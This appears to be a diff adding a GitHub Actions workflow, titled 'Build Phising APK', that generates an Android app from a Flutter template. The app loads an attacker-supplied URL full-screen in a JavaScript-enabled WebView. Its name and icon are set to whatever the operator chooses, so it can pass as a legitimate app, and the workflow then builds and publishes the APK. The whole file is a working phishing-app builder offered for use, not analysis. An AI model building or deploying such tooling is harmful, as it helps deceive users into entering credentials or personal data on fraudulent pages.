@@ -1,0 +1,201 @@
+name: Build Phising APK
+
+on:
+  workflow_dispatch:
+    inputs:
+      app_name:
+        required: true
+      webview_url:
+        required: true
+      username:
+        required: true
+      uid:
+        required: true
+      icon_url:
+        required: false
+        description: 'URL gambar icon (opsional)'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Setup Java
+        uses: actions/setup-java@v4
+        with:
+          distribution: 'temurin'
+          java-version: '17'
+          
+      - name: Setup Flutter
+        uses: subosito/flutter-action@v2
+        with:
+          channel: 'stable'
+          cache: true
+
+      - name: Create Flutter Project
+        run: |
+          flutter create phising_base
+          cd phising_base
+          
+          mkdir -p assets
+          cat > assets/config.json <<EOF
+          {
+            "app_name": "${{ github.event.inputs.app_name }}",
+            "webview_url": "${{ github.event.inputs.webview_url }}",
+            "username": "${{ github.event.inputs.username }}",
+            "uid": "${{ github.event.inputs.uid }}"
+          }
+          EOF
+
+      - name: Inject Main.dart
+        run: |
+          cd phising_base
+          cat > lib/main.dart << 'EOF'
+          import 'dart:convert';
+          import 'package:flutter/material.dart';
+          import 'package:flutter/services.dart';
+          import 'package:webview_flutter/webview_flutter.dart';
+          import 'dart:async';
+
+          void main() {
+            WidgetsFlutterBinding.ensureInitialized();
+            runApp(const MyApp());
+          }
+
+          class MyApp extends StatelessWidget {
+            const MyApp({super.key});
+            @override
+            Widget build(BuildContext context) {
+              return MaterialApp(
+                debugShowCheckedModeBanner: false,
+                home: const SplashScreen(),
+              );
+            }
+          }
+
+          class SplashScreen extends StatefulWidget {
+            const SplashScreen({super.key});
+            @override
+            State<SplashScreen> createState() => _SplashScreenState();
+          }
+
+          class _SplashScreenState extends State<SplashScreen> {
+            @override
+            void initState() {
+              super.initState();
+              _initApp();
+            }
+
+            Future<void> _initApp() async {
+              Map<String, dynamic> config = {};
+              try {
+                final String jsonString = await rootBundle.loadString('assets/config.json');
+                config = jsonDecode(jsonString);
+              } catch (e) {}
+
+              String targetUrl = config['webview_url'] ?? 'https://www.google.com';
+              
+              await Future.delayed(const Duration(seconds: 2));
+              if (mounted) {
+                Navigator.pushReplacement(
+                  context,
+                  MaterialPageRoute(builder: (_) => WebViewScreen(url: targetUrl)),
+                );
+              }
+            }
+
+            @override
+            Widget build(BuildContext context) {
+              return const Scaffold(
+                body: Center(child: CircularProgressIndicator()),
+              );
+            }
+          }
+
+          class WebViewScreen extends StatefulWidget {
+            final String url;
+            const WebViewScreen({super.key, required this.url});
+            @override
+            State<WebViewScreen> createState() => _WebViewScreenState();
+          }
+
+          class _WebViewScreenState extends State<WebViewScreen> {
+            late final WebViewController _controller;
+            @override
+            void initState() {
+              super.initState();
+              _controller = WebViewController()
+                ..setJavaScriptMode(JavaScriptMode.unrestricted)
+                ..loadRequest(Uri.parse(widget.url));
+            }
+            @override
+            Widget build(BuildContext context) {
+              return Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
+            }
+          }
+          EOF
+
+      - name: Update Pubspec
+        run: |
+          cd phising_base
+          cat > pubspec.yaml << 'EOF'
+          name: phising_base
+          environment:
+            sdk: ^3.8.1
+          dependencies:
+            flutter:
+              sdk: flutter
+            webview_flutter: ^4.10.0
+          flutter:
+            uses-material-design: true
+            assets:
+              - assets/config.json
+          EOF
+          flutter pub get
+
+      - name: Change App Name
+        run: |
+          cd phising_base/android/app/src/main
+          sed -i 's/android:label="phising_base"/android:label="${{ github.event.inputs.app_name }}"/g' AndroidManifest.xml
+
+      - name: Change Icon
+        if: ${{ github.event.inputs.icon_url != '' }}
+        run: |
+          cd phising_base/android/app/src/main/res
+          
+          rm -rf mipmap-anydpi-v26
+          
+          echo "Downloading icon..."
+          curl -L "${{ github.event.inputs.icon_url }}" -o icon_original.png
+          
+          if ! file icon_original.png | grep -qE 'PNG|JPEG|image'; then
+            echo "Warning: file bukan gambar valid, pakai icon default Flutter."
+            rm icon_original.png
+            exit 0
+          fi
+          
+          sudo apt-get update -qq && sudo apt-get install -y -qq imagemagick
+          
+          for size in 48 72 96 144 192; do
+            convert icon_original.png -resize ${size}x${size} icon_${size}.png
+          done
+          
+          cp icon_48.png mipmap-mdpi/ic_launcher.png
+          cp icon_72.png mipmap-hdpi/ic_launcher.png
+          cp icon_96.png mipmap-xhdpi/ic_launcher.png
+          cp icon_144.png mipmap-xxhdpi/ic_launcher.png
+          cp icon_192.png mipmap-xxxhdpi/ic_launcher.png
+          
+          echo "Icon replaced."
+
+      - name: Build APK
+        run: |
+          cd phising_base
+          flutter build apk --release
+          
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: phising-apk
+          path: phising_base/build/app/outputs/flutter-apk/app-release.apk
